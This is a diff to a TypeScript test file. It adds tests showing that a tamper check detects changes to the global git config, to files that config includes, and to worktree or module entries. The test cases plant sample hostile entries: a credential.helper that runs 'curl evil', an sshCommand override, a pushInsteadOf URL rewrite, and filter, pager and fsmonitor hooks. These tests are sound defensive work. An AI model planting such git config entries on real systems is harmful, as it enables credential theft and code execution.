@@ -1,6 +1,6 @@
-import { appendFileSync, mkdirSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
+import { appendFileSync, mkdirSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
-import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 
 import { summarizeChanges } from '../../../copilot-run/job.js';
 import { defaultExec } from '../../../ship/exec.js';
@@ -170,5 +170,78 @@ describe('review-lane tamper check', () => {
     const raw = ['?? .omg/state/x.json', '?? .omg/skills/new.md', ' D .omg/skills/old.md', '?? src/a.ts', ''].join('\0');
     expect(stableStatus(raw, '.omg').split('\n')).toEqual([' D .omg/skills/old.md', '?? .omg/skills/new.md', '?? src/a.ts']);
     expect(stableStatus(raw, null).split('\n')).toHaveLength(4);
+  });
+
+  describe('the global git config (a fake HOME)', () => {
+    let home: string;
+    beforeEach(() => {
+      home = join(h.dir, 'home');
+      mkdirSync(home);
+      vi.stubEnv('HOME', home);
+      vi.stubEnv('GIT_CONFIG_GLOBAL', '');
+      vi.stubEnv('XDG_CONFIG_HOME', '');
+      writeFileSync(join(home, '.gitconfig'), '[user]\n\tname = me\n[include]\n\tpath = ~/inc/one.gitconfig\n');
+      mkdirSync(join(home, 'inc'));
+      writeFileSync(join(home, 'inc', 'one.gitconfig'), '[includeIf "gitdir:~/work/"]\n\tpath = two.gitconfig\n');
+      writeFileSync(join(home, 'inc', 'two.gitconfig'), '[core]\n\tautocrlf = false\n');
+    });
+    afterEach(() => { vi.unstubAllEnvs(); });
+
+    it('is not tampering when nothing changes', () => {
+      expect(problemsAfter(() => {})).toEqual([]);
+    });
+
+    it.each<[string, () => void]>([
+      ['a credential.helper planted in ~/.gitconfig', () => appendFileSync(join(home, '.gitconfig'), '[credential]\n\thelper = !sh -c "curl evil"\n')],
+      ['a new $XDG_CONFIG_HOME/git/config (default ~/.config)', () => { mkdirSync(join(home, '.config', 'git'), { recursive: true }); writeFileSync(join(home, '.config', 'git', 'config'), '[core]\n\tsshCommand = evil\n'); }],
+      ['an include.path target', () => appendFileSync(join(home, 'inc', 'one.gitconfig'), '[url "evil:"]\n\tpushInsteadOf = https://\n')],
+      ['a nested includeIf target', () => appendFileSync(join(home, 'inc', 'two.gitconfig'), '[filter "x"]\n\tclean = evil\n')],
+    ])('fails on %s', (_name, tamper) => {
+      expect(problemsAfter(tamper).join('\n')).toMatch(/global git config or a file a git config includes changed/);
+    });
+
+    it('fails when a file outside the repo that the repository config includes changes (the config itself does not)', () => {
+      const outside = join(h.dir, 'outside.gitconfig');
+      writeFileSync(outside, '[core]\n\tquotepath = false\n');
+      git('config', 'include.path', outside);
+      const before = snapshotRepo(exec, h.root);
+      appendFileSync(outside, '[credential]\n\thelper = !evil\n');
+      expect(compareSnapshots(before, snapshotRepo(exec, h.root, '.omg', before))).toEqual([expect.stringMatching(/global git config or a file a git config includes changed/)]);
+    });
+
+    it('GIT_CONFIG_GLOBAL replaces ~/.gitconfig as the file that is hashed', () => {
+      const alt = join(h.dir, 'alt.gitconfig');
+      writeFileSync(alt, '[user]\n\tname = alt\n');
+      vi.stubEnv('GIT_CONFIG_GLOBAL', alt);
+      expect(problemsAfter(() => appendFileSync(alt, '[core]\n\tpager = evil\n')).join('\n')).toMatch(/global git config/);
+    });
+  });
+
+  describe('worktrees/ and modules/ entries', () => {
+    const other = () => join(h.root, '.git', 'worktrees', 'other');
+    beforeEach(() => { git('worktree', 'add', '-q', '-b', 'other', join(h.dir, 'other'), head); });
+
+    it('a deleted live worktrees/<id> entry is reported', () => {
+      expect(problemsAfter(() => rmSync(other(), { recursive: true, force: true })).join('\n')).toMatch(/worktree entry worktrees\/other was removed/);
+    });
+
+    it('a worktrees/<id> entry replaced by a symlink or junction is reported', () => {
+      const fake = join(h.dir, 'fake-entry');
+      mkdirSync(fake);
+      expect(problemsAfter(() => {
+        rmSync(other(), { recursive: true, force: true });
+        symlinkSync(fake, other(), 'junction');
+      }).join('\n')).toMatch(/worktrees\/other is not a real directory \(a symlink or junction to /);
+    });
+
+    it('a new junction under modules/ is reported', () => {
+      const fake = join(h.dir, 'fake-module');
+      mkdirSync(fake);
+      writeFileSync(join(fake, 'config'), '[core]\n\tfsmonitor = evil\n');
+      expect(problemsAfter(() => {
+        mkdirSync(join(h.root, '.git', 'modules'), { recursive: true });
+        symlinkSync(fake, join(h.root, '.git', 'modules', 'sub'), 'junction');
+      }).join('\n')).toMatch(/modules\/sub is not a real directory/);
+    });
   });
 });
